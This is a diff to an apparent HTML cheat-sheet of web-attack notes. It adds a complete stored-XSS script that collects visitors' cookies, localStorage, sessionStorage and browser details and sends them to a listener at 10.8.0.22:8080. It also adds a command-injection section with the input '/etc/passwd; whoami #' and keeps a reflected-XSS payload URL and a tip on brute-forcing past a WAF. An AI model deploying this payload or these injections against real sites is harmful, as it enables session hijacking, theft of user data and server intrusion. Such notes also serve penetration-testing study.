@@ -109,8 +109,48 @@
                         Here what has been done is to close the select and inject the code there.
                         <pre><code class="language-js">https://URL.com/product?productId=2&storeId=&lt;/select&gt;&lt;svg onload=alert(1)&gt;</code></pre>
 
+                        <p>In case you find out that XSS stored is available in a website you can run the following code in order to capture diferent parameters from the user who visit the affected website. Capture it using a python server</p>
+                        <pre><code class="language-js">&lt;script&gt;
+    // Crear un objeto XMLHttpRequest para enviar la información al servidor
+    var xhr = new XMLHttpRequest();
+    
+    // Recopilar información del navegador
+    var userAgent = navigator.userAgent;  // Información del navegador
+    var referer = document.referrer;  // Referer de la página
+    var url = window.location.href;  // URL actual
+    var cookies = document.cookie;  // Cookies del navegador
+    var localStorageData = JSON.stringify(localStorage);  // Datos de localStorage
+    var sessionStorageData = JSON.stringify(sessionStorage);  // Datos de sessionStorage
+    var screenWidth = screen.width;  // Ancho de la pantalla
+    var screenHeight = screen.height;  // Alto de la pantalla
+
+    // Recopilar todos los datos en una cadena de consulta
+    var data = "userAgent=" + encodeURIComponent(userAgent) +
+               "&referer=" + encodeURIComponent(referer) +
+               "&url=" + encodeURIComponent(url) +
+               "&cookies=" + encodeURIComponent(cookies) +
+               "&localStorage=" + encodeURIComponent(localStorageData) +
+               "&sessionStorage=" + encodeURIComponent(sessionStorageData) +
+               "&screenWidth=" + encodeURIComponent(screenWidth) +
+               "&screenHeight=" + encodeURIComponent(screenHeight);
+
+    // Enviar los datos al servidor usando un GET
+    xhr.open("GET", "http://10.8.0.22:8080/" + data, true);
+    xhr.send();
+&lt;/script&gt;
+</code></pre>
                         <p> Avoiding WAF</p>
                         In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2>Command Injection</h2>
+                    <ul>
+                        <h3>Situations</h3>
+                        <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
+                        <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
+                        <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
                     </ul>
                 </div>
             
@@ -133,7 +173,9 @@
                     </ul>
                 </div>
                 
+
                 
+
             <div class="notion-header">
                 <h1 id="Python">Python</h1>
             </div>
